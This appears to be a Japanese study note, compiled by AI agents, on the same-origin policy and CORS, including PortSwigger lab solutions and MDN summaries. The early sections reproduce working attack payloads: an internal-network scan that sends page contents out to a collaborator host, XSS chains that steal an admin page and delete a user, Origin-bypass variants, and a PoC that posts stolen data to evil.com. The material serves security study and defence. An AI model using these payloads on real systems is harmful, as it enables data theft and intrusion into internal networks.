var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
```

**Step 2** ― 発見した内部IP（`$ip`）の `username` フィールドのXSSを探る。成功すると `foundXSS=1` がCollaborator/ログに出る（**逐語**）:

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

**Step 3** ― 発見したXSSで `/admin` ページのソースを窃取（**逐語**）:

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

**Step 4** ― Step3で得た `/admin` のフォームを使い、iframe注入で `carlos` を削除（**逐語**）:

```
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
  }
  ))
}

fetchUrl("http://$ip");
</script>
```

〔補足〕このラボは「CORSでワイルドカード等が緩いと、被害者ブラウザ経由で本来到達不能な**内部ネットワークをスキャン→XSS発見→管理操作**まで多段でpivotできる」ことを示す。防御は内部サービスでもOrigin検証を厳格化し、`*`を返さない・認証を必須化すること。

---

### 7. CORS検出ツール （出典: PayloadsAllTheThings + six2dez 逐語）

PayloadsAllTheThings のツール一覧（**逐語**）:

```
* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
```

six2dez のツール実行例（**逐語**）:

```bash
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com
# https://github.com/chenjj/CORScanner
python cors_scan.py -u example.com
# https://github.com/Shivangx01b/CorsMe
echo "https://example.com" | ./Corsme 
cat subdomains.txt | ./httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
cat http_https.txt | ./CorsMe -t 70
# CORSPoc
# https://tools.honoki.net/cors.html
```

---

### 8. JSONP と Origin バイパス変異リスト （出典: six2dez 逐語）

JSONP（CORS以前のクロスオリジンデータ取得手法。`callback` パラメータでコールバック関数名を渡すと、`関数名(JSONデータ)` として返る。認証付きだと情報漏洩源になりうる）:

```
# JSONP
In GET URL append “?callback=testjsonp”
Response should be:
testjsonp(<json-data>)
```

Origin検証バイパスで試す変異（**逐語**）:

```
# Bypasses
Origin:null
Origin:attacker.com
Origin:attacker.target.com
Origin:attackertarget.com
Origin:sub.attackertarget.com
```

〔補足〕上のリストの狙い: `null`（null信頼）、無関係ドメイン（反射確認）、`attacker.target.com`（サブドメイン許可の悪用）、`attackertarget.com`（ドット除去＝接尾辞/正規表現ミス）、`sub.attackertarget.com`（多段サブドメイン）。実務ではさらに `target.com.attacker.com`（接尾辞一致の悪用）、`attacker-target.com`、大文字小文字、末尾スラッシュ、ポート付き、scheme違い（http/https）も試す。

---

### 9. PoC テンプレート集 （出典: six2dez 逐語 ― そのまま検証に使える雛形）

**CORS PoC（GETで機密を画面表示）**:

```
<!DOCTYPE html>
<html>
<head>
<title>CORS PoC Exploit</title>
</head>
<body>
<center>

<h1>CORS Exploit<br>six2dez</h1>
<hr>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script type="text/javascript">
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if(this.readyState == 4 && this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
     }
   };
 xhttp.open("GET", "http://<vulnerable-url>", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
</script>

</center>
</body>
</html>
```

**CORS PoC 2（POST）**:

```
<html>
<script>
var http = new XMLHttpRequest();
var url = 'Url';//Paste here Url
var params = 'PostData';//Paste here POST data
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

</script>
</html>
```

**CORS PoC 3 - Sensitive Data Leakage（機密を読み取り攻撃者サーバへPOST）**:

```
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='corspoc'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from target1337.com about user account
document.getElementById("corspoc").innerHTML = a;
xhttp.open("POST", "https://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("POST", "https://target1337.com", true);
xhttp.withCredentials = true;
var body = "requestcontent";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhttp.send(new Blob([aBody]));
}
</script>
</body>
</html>
```

**CORS JSON PoC（JSONP窃取）**:

```
<!DOCTYPE html>
<html>
<head>
<title>JSONP PoC</title>
</head>
<body>
<center>

<h1>JSONP Exploit<br>YourTitle</h1>
<hr>
<div id="demo">
<button type="button" onclick="trigger()">Exploit</button>
</div>
<script>

function testjsonp(myObj) {
  var result = JSON.stringify(myObj)
  document.getElementById("demo").innerHTML = result;
  //console.log(myObj)
}

</script>

<script >

  function trigger() {
    var s = document.createElement("script");
    s.src = "https://<vulnerable-endpoint>?callback=testjsonp";
    document.body.appendChild(s);
}

</script>
</body>
</html>
```

---

### 10. 防御・修正の要点 （出典: PortSwigger方針 + 一般知識）

〔補足（一般知識、PortSwigger推奨と整合）〕
1. **Originを反射しない**。許可オリジンの**厳密な許可リスト（完全一致）**で照合する。
2. **`null` を信頼リストに入れない**（`Access-Control-Allow-Origin: null` を返さない）。sandbox iframe/data URI/redirect で容易に偽装される。
3. **機密APIに `Access-Control-Allow-Origin: *` を使わない**。内部サービスも同様（pivot対策）。`*` と資格情報は併用不可という仕様も理解する。
4. **正規表現で照合するなら `.` を `\.` でエスケープ**し、前方/部分一致ではなくアンカーで完全一致。
5. **動的にACAOを返すなら `Vary: Origin` を必ず付与**（キャッシュ汚染防止）。
6. **`Access-Control-Allow-Credentials: true` は本当に必要な場合だけ**。資格情報不要ならCookieに依存しない設計に。
7. **HTTP等の安全でないプロトコル/サブドメインを信頼しない**（サブドメインのXSSが即CORS窃取に化ける）。
8. CORSは**内部の認証・認可の代替ではない**。CORSで読めても各エンドポイント自体の認可を厳格に。
9. サブドメインのXSSを潰す（信頼オリジンの侵害はCORS防御を無意味にする）。

---

### 11. 【補完エージェント追記】MDN Web Docs 公式ドキュメントによる権威ある裏付け

> **取得元（実取得・逐語確認済み）**:
> - MDN「Same-origin policy」 `https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy`（GitHub raw: `mdn/content` → `files/en-us/web/security/defenses/same-origin_policy/index.md`）
> - MDN「Cross-Origin Resource Sharing (CORS)」 `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS`（GitHub raw: `files/en-us/web/http/guides/cors/index.md`）
> - MDN 用語集「Origin」 `https://developer.mozilla.org/en-US/docs/Glossary/Origin`（GitHub raw: `files/en-us/glossary/origin/index.md`）
>
> Medium記事本文が取得できなかったため、**同一テーマを扱うMDN公式ドキュメントを一次相当の出典として**以下を補う。本節の記述はすべて上記MDNページに基づく（`〔補足（一般知識）〕` ではなく **MDN逐語/要約**）。前節までの一般知識補足の多くを、この節が正式に裏付ける。

#### 11-1. オリジンとSOPの定義（MDN逐語） （出典: MDN Same-origin policy / Glossary:Origin）

MDNのSOP定義（**逐語**）:

```
The same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin. It helps isolate potentially malicious documents, reducing possible attack vectors. For example, it prevents a malicious website on the Internet from running JS in a browser to read data from a third-party webmail service (which the user is signed into) or a company intranet (which is protected from direct access by the attacker by not having a public IP address) and relaying that data to the attacker.
```

オリジンの定義（**逐語**）: 「Two URLs have the _same origin_ if the protocol, port (if specified), and host are the same for both.（scheme/host/port tuple）」

MDNのオリジン比較表（基準URL `http://store.company.com/dir/page.html`、**逐語再現**。前掲PortSwigger表と別例で相互補強される）:

| URL | Outcome | Reason |
| --- | --- | --- |
| `http://store.company.com/dir2/other.html` | Same origin | Only the path differs |
| `http://store.company.com/dir/inner/another.html` | Same origin | Only the path differs |
| `https://store.company.com/page.html` | Failure | Different protocol |
| `http://store.company.com:81/dir/page.html` | Failure | Different port (`http://` is port 80 by default) |
| `http://news.company.com/dir/page.html` | Failure | Different host |

#### 11-2. 継承オリジン・opaque origin・fileオリジン（MDN） ★ノート第1節を強化

MDNは、前掲note第1節の「不透明オリジン(opaque origin)」を**正式に定義**する（出典: MDN Glossary:Origin, Same-origin policy）:

- **opaque origin（不透明オリジン）**（**逐語**）: 「An opaque origin is a special type of browser-internal value that obscures the true origin of a resource (opaque origins are always serialized as `null`). They are used by the browser to ensure resource isolation as they are never considered equal to any other origin — including other opaque origins.」→ **常に `null` にシリアライズされ、他のどのオリジン（他のopaque origin含む）とも決して等しくならない**。これがnull origin攻撃の技術的核心。
- opaque origin が使われる代表ケース（**MDN逐語**）:
  - `sandbox` 属性付きで `allow-same-origin` を**含まない** iframe 内のドキュメント。
  - `file:` URL は通常opaque origin として扱われ、ファイル同士が互いを読めないようにする。
  - `DOMImplementation.createDocument()` 等でプログラム生成したドキュメント。
- **継承オリジン（inherited origins）**（**MDN逐語要約**）: `about:blank` や `javascript:` URL から実行されたスクリプトは、**それを含む文書のオリジンを継承**する（これらのURLはオリジンサーバ情報を持たないため）。一方 **`data:` URL は新しい空のセキュリティコンテキスト**（=opaque/null）を得る。
- **fileオリジン**（**MDN逐語要約**）: モダンブラウザは `file:///` を通常opaque origin扱いにする。ただしURL仕様上fileオリジンは実装依存で、同一ディレクトリを同一オリジン扱いにするブラウザもあり得る（過去に脆弱性の原因: Mozilla MFSA2019-21 / CVE-2019-11730）。

〔本ノートへの含意〕note第4-5節「null originの発生源」（sandbox iframe/data URI/file/redirect）は、このMDNのopaque origin定義で厳密に裏付けられた。

#### 11-3. document.domain は非推奨（MDN公式WARNING） ★ノート第3節を強化

note第3節（一般知識）を**MDN公式が裏付ける**（出典: MDN Same-origin policy「Changing origin」）。MDNの警告（**逐語**）:

```
The approach described here (using the document.domain setter) is deprecated because it undermines the security protections provided by the same origin policy, and complicates the origin model in browsers, leading to interoperability problems and security bugs.
```

MDNの追加事実（要約）:
- `document.domain` には**現在のドメインまたはその上位ドメイン**のみ設定でき、`company.com` から `othercompany.com` にはできない（上位ドメインでないため）。
- **ポート番号は別途チェックされる**。`document.domain = document.domain` を含む**あらゆる `document.domain` 代入はポート番号を `null` に上書き**する。よって `company.com:8080` と `company.com` を通話させるには両者で設定が必要（両方 port=null になる）。
- **sandbox iframe 内で `document.domain` を設定すると `SecurityError` DOMException**。また `localStorage`/`indexedDB`/`BroadcastChannel`/`SharedWorker` 等の多くのWeb APIのオリジンチェックには**影響しない**（=これらは `document.domain` 緩和を無視する）。
- 親子で使うなら**双方で同じ値**に設定必須（親を元の値に戻すだけでも両方で明示設定が要る）。

#### 11-4. クロスオリジンの write/embed/read の非対称性（MDN逐語） ★ノート第2節を強化

note第2節（一般知識で書いた3分類）を**MDN公式が裏付ける**（出典: MDN Same-origin policy「Cross-origin network access」、**逐語**）:

```
• Cross-origin writes are typically allowed. Examples are links, redirects, and form submissions. Some HTTP requests require preflight.
• Cross-origin embedding is typically allowed. (Examples are listed below.)
• Cross-origin reads are typically disallowed, but read access is often leaked by embedding. For example, you can read the dimensions of an embedded image, the actions of an embedded script, or the availability of an embedded resource.
```

**重要な追加洞察**（note未記載）: 「read は原則禁止だが、**埋め込み(embedding)を通じてしばしば漏れる**」。例: 埋め込んだ画像の**寸法**は読める、埋め込みスクリプトの**動作**は観測できる、埋め込みリソースの**存在有無**は判定できる（サイドチャネル）。これがXS-Leaks系攻撃の土台。

MDNが挙げるクロスオリジン埋め込み可能リソース（**逐語要約**）: `<script src>`（構文エラー詳細は同一オリジンのみ）、`<link rel=stylesheet>`（**正しい `Content-Type` が必要**。MIME不正だとブロック）、`<img>`、`<video>`/`<audio>`、`<object>`/`<embed>`、`@font-face`（ブラウザにより同一オリジン要求）、`<iframe>`（`X-Frame-Options` でframe拒否可）。

MDNの「クロスオリジンアクセスを防ぐ方法」（**逐語要約**、note第10節の防御を補強）:
- **書き込み阻止**: リクエスト内の推測不能トークン（**CSRFトークン**）を検証する。そのトークンを要するページの**読み取り**も防ぐこと。
- **読み取り阻止**: リソースを埋め込み不可にする（埋め込みは常に何らかの情報を漏らすため）。
- **埋め込み阻止**: リソースが埋め込み可能フォーマットとして解釈されないようにする。**ブラウザは `Content-Type` を尊重しないことがある**（例: `<script>` にHTMLを指すとブラウザはHTMLをJSとして解釈しようとする）。エントリポイントでないリソースにはCSRFトークンで埋め込みも防げる。

#### 11-5. クロスオリジンで許可される Window/Location プロパティ（MDN権威表） ★ノート第2節のsix2dez例外リストを厳密化

note第2節のsix2dez「SOP例外」記述を、**MDNの正式な許可プロパティ表**で置き換え可能にする（出典: MDN Same-origin policy「Cross-origin script API access」。仕様: HTML Living Standard § Cross-origin objects）。**クロスオリジンでも許可される**アクセスは以下に限られる（**逐語再現**）:

`Window` のメソッド（クロスオリジンで**呼べる**）: `window.blur` / `window.close` / `window.focus` / `window.postMessage`

`Window` の属性:

| 属性 | クロスオリジン可否 |
| --- | --- |
| `window.closed` | Read only（読めるが書けない） |
| `window.frames` | Read only |
| `window.length` | Read only |
| `window.location` | **Read/Write** |
| `window.opener` | Read only |
| `window.parent` | Read only |
| `window.self` | Read only |
| `window.top` | Read only |
| `window.window` | Read only |

`Location` のメソッド（クロスオリジンで呼べる）: `location.replace`
`Location` の属性: `location.href` → **Write-only（書けるが読めない）**

〔含意〕six2dezの箇条書き（`location`は書けるが読めない／`window.length`・`closed`は読めるが書けない／`replace`はクロスドメイン可／`close`・`blur`・`focus`・`postMessage`は呼べる）は、**このMDN表と完全に整合**し、`window.location` が唯一 Read/Write 両方許可、`location.href` は Write-only、という粒度まで確認できる。ドキュメント間通信は **`window.postMessage` を使う**のがMDN公式推奨（別担当のpostMessage脆弱性へ接続）。

#### 11-6. シンプルリクエストの厳密な条件（MDN逐語） ★ノート第4-1節を厳密化

note第4-1節（一般知識）に対し、MDNの**完全な条件**（note未記載の条件を含む。出典: MDN CORS「Simple requests」、**逐語要約**）:

1. メソッドが `GET` / `HEAD` / `POST` のいずれか。
2. UAが自動設定するヘッダ以外で手動設定できるのは **CORS-safelisted request-headers** のみ: `Accept` / `Accept-Language` / `Content-Language` / `Content-Type`（下記制限付き） / `Range`（**単一range値のみ**。例 `bytes=256-`）。
3. `Content-Type` は `application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain` のいずれかのみ。
4. **（note未記載）** `XMLHttpRequest` 使用時、`xhr.upload` に**イベントリスナが登録されていない**こと（`xhr.upload.addEventListener()` を呼んでいたら非シンプル）。
5. **（note未記載）** リクエストに **`ReadableStream` オブジェクトを使っていない**こと。

MDNの重要な前提（**逐語要約**）: シンプルリクエストの概念は、HTML 4.0の `<form>` が既に任意オリジンへsimpleなリクエストを送れた歴史に由来する。だから**サーバは元々CSRF対策を実装しているはず**という前提で、form送信相当のリクエストはpreflight（サーバのopt-in）なしに送れる。ただし**レスポンスをスクリプトと共有する**には、サーバは `Access-Control-Allow-Origin` でopt-inが必要。

#### 11-7. プリフライトの完全なやり取り（MDN実例逐語） ★ノート第4-2節を実データで補強

MDNのpreflight実例（`POST` + `Content-Type: text/xml` + 独自ヘッダ `X-PINGOTHER` → preflight発生）。**プリフライト要求→応答（逐語）**:

```http
OPTIONS /doc HTTP/1.1
Host: bar.other
Origin: https://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-pingother

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
```

MDNの明確化ポイント（**逐語要約**、note補強）:
- `Access-Control-Request-Method` = 本リクエストで使うメソッドをサーバに予告。`Access-Control-Request-Headers` = 本リクエストで付ける非safelistヘッダを予告。
- `OPTIONS` は**safe method**（リソースを変更しない）。
- **`Access-Control-Max-Age` の既定値は5秒**。ブラウザごとに**上限**があり `Max-Age` がそれを超えると上限が優先。例の `86400` は24時間。
- **本リクエスト（実POST）には `Access-Control-Request-*` ヘッダは含まれない**（preflightのOPTIONSにのみ必要）。

**プリフライトとリダイレクト**（note未記載の実務知識、**MDN逐語要約**）: 一部ブラウザは preflight後のリダイレクト追従を未サポートで「The request was redirected to ..., which is disallowed for cross-origin requests that require preflight.」エラーになる。仕様は当初これを要求→後に不要へ変更されたが未実装のブラウザが残る。回避策は「preflightやredirectを避けるようサーバ変更」「simple request化」、または「先にsimple requestで最終URL（`Response.url`/`XMLHttpRequest.responseURL`）を得てから本リクエストを投げる」。ただし **`Authorization` ヘッダ由来のpreflightはこの回避が効かない**。

#### 11-8. 資格情報とワイルドカードの排他ルール（MDN逐語） ★ノート第4-3節の核心を公式裏付け

note第4-3節の中心ルールを**MDN公式が明文で裏付ける**（出典: MDN CORS「Credentialed requests and wildcards」、**逐語要約**）:

資格情報付きレスポンスで、サーバは `*` ワイルドカードを**使ってはならない**。具体値が必要:
- `Access-Control-Allow-Origin` に `*` 不可 → 明示オリジン（例 `https://example.com`）。
- `Access-Control-Allow-Headers` に `*` 不可 → 明示ヘッダ名リスト。
- `Access-Control-Allow-Methods` に `*` 不可 → 明示メソッド名リスト。
- `Access-Control-Expose-Headers` に `*` 不可 → 明示ヘッダ名リスト。

MDN逐語の帰結:
```
If a request includes a credential (most commonly a Cookie header) and the response includes an Access-Control-Allow-Origin: * header (that is, with the wildcard), the browser will block access to the response, and report a CORS error in the devtools console.
```
```
But if a request does include a credential (like the Cookie header) and the response includes an actual origin rather than the wildcard (like, for example, Access-Control-Allow-Origin: https://example.com), then the browser will allow access to the response from the specified origin.
```

**（note未記載の重要事実）**: 「`Access-Control-Allow-Origin` が `*`（実オリジンでない）だと、レスポンスの `Set-Cookie` は**Cookieを設定しない**」（MDN逐語要約）。

**プリフライトと資格情報**（MDN逐語）: 「CORS-preflight requests **must never include credentials**. The response to a preflight request must specify `Access-Control-Allow-Credentials: true` to indicate that the actual request can be made with credentials.」→ **preflight(OPTIONS)自体にはCookieが乗らない**が、その応答に `Access-Control-Allow-Credentials: true` があって初めて本リクエストを資格情報付きで送れる。

#### 11-9. サードパーティCookie / SameSite との相互作用（MDN、note未記載）

MDNの注意（**逐語要約**、CORS窃取の実効性を左右する重要点）:
- クロスドメインへの credentialed リクエストには、**サーバ/クライアント設定に関係なくサードパーティCookieポリシーが常に適用**される。
- サードパーティCookieポリシーが third-party cookie の送信を止めると、`Access-Control-Allow-Credentials` でサーバが許可していても**実質的にcredentialedリクエストが成立しない**。既定はブラウザで異なり、**`SameSite` 属性**で制御される。
- ブラウザがサードパーティCookieを全拒否する設定なら、`Set-Cookie` も無効化される。

〔含意〕現代ブラウザの3rd-party cookie制限・`SameSite=Lax`既定により、**古典的なCORS credential窃取PoC（`withCredentials=true`）は成立条件が狭まっている**。診断時は標的Cookieの `SameSite` 値・ブラウザの3rd-partyCookie設定も考慮する。ただし**同一サイト(same-site)内の別オリジン**間や、`SameSite=None; Secure` のCookieでは依然成立しうる。

#### 11-10. レスポンス/リクエストヘッダの公式定義（MDN、note第4-2節の一般知識を厳密化）

MDNのヘッダ定義（**逐語要約**、note第4-2節で一般知識としていた各ヘッダを公式裏付け）:
- `Access-Control-Allow-Origin: <origin> | *` — 資格情報**なし**の要求に限り `*` が「任意オリジン許可」を意味する。動的に単一オリジンを返すなら **`Vary: Origin` を付けるべき**（MDN明記）。
- `Access-Control-Expose-Headers` — JS（`Response.headers` 等）が読めるレスポンスヘッダの許可リストを追加。
- `Access-Control-Max-Age: <delta-seconds>` — preflight結果のキャッシュ秒数。
- `Access-Control-Allow-Credentials: true` — credentialsフラグtrue時にレスポンスを開示してよいか。simple GETはpreflightされないので、このヘッダが無いとブラウザはレスポンスを破棄。
- `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` — preflight応答で許可メソッド/ヘッダを列挙。
- `Origin` リクエストヘッダ — 「**any access control request で常に送られる**」「パス情報を含まずサーバ名のみ」「値は `null` になり得る」（MDN逐語要約）。

MDNのCORS失敗の性質（**逐語要約**、診断上有用）: 「CORS failures result in errors but for security reasons, specifics about the error are **not available to JavaScript**. All the code knows is that an error occurred. The only way to determine what specifically went wrong is to look at the browser's console.」→ **JSはCORSエラーの詳細を取れない**（成否だけ）。詳細はブラウザのDevToolsコンソールでのみ判る。

---

## 読者が自分で開くべき資料（取得不可・要自読）

### A. https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145 （状態: failed）

**なぜ取得できなかったか**: 本セッションのegressプロキシがMedium系ドメインを全面遮断（WebFetch=`EGRESS_BLOCKED`、curl=`CONNECT tunnel failed, response 403`）。**補完エージェントによる再試行も全滅**: `freedium.cfd`（Medium有料回避ミラー）・`scribe.rip`（Mediumフロントエンド）・`archive.ph`（archive.today）はいずれも `403` で遮断、`web.archive.org` も遮断、WebSearchはセッション予算枯渇（200/200）で二次情報の断片取得も不可。MediumはGitHub等に本文ミラーが無いため、**この記事固有の文章・図解は最後まで取得できなかった（捏造していない）**。

**代替（この記事のテーマを無料で読める権威ある同等資料）** ― 本ノート第11節はこれらから作成した:
- MDN「Same-origin policy」: `https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy`
- MDN「Cross-Origin Resource Sharing (CORS)」: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS`
- MDN 用語集「Origin」: `https://developer.mozilla.org/en-US/docs/Glossary/Origin`
- （記事本文をどうしても読みたい場合の自力手段）ブラウザで直接 `emrebener.medium.com/...` を開く／`https://freedium.cfd/` に元URLを貼る／`https://webcache.googleusercontent.com/` は現在は不可なので `https://archive.ph/` で当該URLを検索。

**読みどころ（自分で開いたら読むべき点。第11節=MDNで裏は取れているので、記事「固有」の付加価値を拾う目的で読む）**:
1. **SOPの定義とオリジン3要素（scheme/host/port）** の基本解説 ― 本ノート第1・11-1節と突き合わせる。
2. **SOPが「読み取りだけ禁じ、埋め込み・送信は許す」非対称性**の説明と具体例（画像canvas汚染、iframe DOMアクセス禁止など）― 第11-4節に対応するMDN根拠あり。
3. **CORSの動作フロー（simple request と preflight OPTIONS）** の**図解**。MDNにも図があるが、この記事著者独自の図・言い回しがあれば拾う（第11-6/11-7節と照合）。
4. **`Access-Control-Allow-Credentials` とワイルドカードの相互排他**という核心ルールを著者の言葉で再確認（第11-8節がMDN逐語で裏付け済み）。
5. **`document.domain` などレガシー緩和**への言及があれば位置づけ（第11-3節でMDN公式が「deprecated」と明言）。
6. 記事末尾の**まとめ／設定ミス例／防御**の節（本ノートに無い図解・具体例・著者の実務コメントを補う目的で。核心概念は第11節で網羅済みなので、差分だけ拾えばよい）。

### B. https://portswigger.net/web-security/cors （状態: partial ― 本文の実質内容はミラーで確保済み）

**なぜ直接取得できなかったか**: portswigger.net もegressプロキシで遮断（403）。ただし内容は `six2dez/pentest-book` と `swisskyrepo/PayloadsAllTheThings`（いずれもGitHub raw経由で取得成功）に **オリジン比較表・SOP例外リスト・4ラボ全解法が逐語転載**されており、加えてcloneずみ `psw/` リポジトリに3ラボの詳細walk-throughがあるため、実質的内容は高忠実で再現済み。

**それでも公式ページで直接確認する価値がある点（読みどころ）**:
1. **CORSトピックの本文構成**（「What is CORS」「Same-origin policy」「Relaxation with CORS」「Vulnerabilities arising from CORS」「How to prevent」）の原文言い回し。
2. **各ラボの公式難易度表示と最新の解法手順**（PortSwiggerはラボを更新することがある。特にラボ④ internal network pivot の最新版）。本ノートの解法は第三者ミラー時点のもの。
3. **`Access-Control-Max-Age` / `Access-Control-Expose-Headers` / プリフライト**の公式説明（本ノートは一般知識で補完しているため、原文の厳密な定義を照合）。
4. 関連する**「Exploiting CORS misconfigurations for Bitcoins and bounties」(James Kettle)** ブログへのリンク（実戦事例の一次情報）。
5. Burp Suite（Repeater / Collaborator / exploit server）を使った公式の検証フロー。

**補足（仕様・概念の公式裏付けが欲しい場合）**: PortSwiggerの「What is CORS / same-origin policy / How CORS works / How to prevent」の各prose節に相当する**権威ある一次資料は取得済み**で、本ノート第11節に反映した（MDN CORS `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS` と MDN SOP `https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy`）。さらに厳密な規範定義は **WHATWG Fetch仕様**（`https://fetch.spec.whatwg.org/#http-cors-protocol`）と **HTML Living Standard § Cross-origin objects**（`https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-objects`）を参照。

---

## 付録: 本ノートの主要ソースファイル（セッション内パス）

| 内容 | パス |
| --- | --- |
| PortSwigger CORS academy 逐語ミラー（表・SOP例外・4ラボ解法） | `scratchpad/six2dez-cors.md`（`six2dez/pentest-book` の `enumeration/web/cors.md`） |
| CORS攻撃ペイロード集 | `scratchpad/patt-cors.md`（`swisskyrepo/PayloadsAllTheThings` の `CORS Misconfiguration/README.md`） |
| ラボ① basic origin reflection walk-through+script | `scratchpad/psw/13_cross_origin_resource_sharing_CORS/CORS_vulnerability_with_basic_origin_reflection/` |
| ラボ② trusted null origin | 同 `.../CORS_vulnerability_with_trusted_null_origin/` |
| ラボ③ trusted insecure protocols | 同 `.../CORS_vulnerability_with_trusted_insecure_protocols/` |
| MDN CORS ガイド（第11節の主出典・逐語取得） | `raw.githubusercontent.com/mdn/content/main/files/en-us/web/http/guides/cors/index.md`（→ `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS`） |
| MDN Same-origin policy（第11節の主出典・逐語取得） | `raw.githubusercontent.com/mdn/content/main/files/en-us/web/security/defenses/same-origin_policy/index.md`（→ `https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy`） |
| MDN 用語集 Origin（opaque origin定義） | `raw.githubusercontent.com/mdn/content/main/files/en-us/glossary/origin/index.md`（→ `https://developer.mozilla.org/en-US/docs/Glossary/Origin`） |

> **補完エージェント注記（2026-09-18）**: 第11節はMedium記事の取得失敗を埋めるため、MDN公式ドキュメントのGitHub原本（上記3ファイル）を逐語取得して作成した。emrebener の Medium 記事本文そのものは egress全面遮断＋WebSearch枯渇により最後まで取得できず、その旨は「## 読者が自分で開くべき資料」A節に明記。捏造は行っていない。
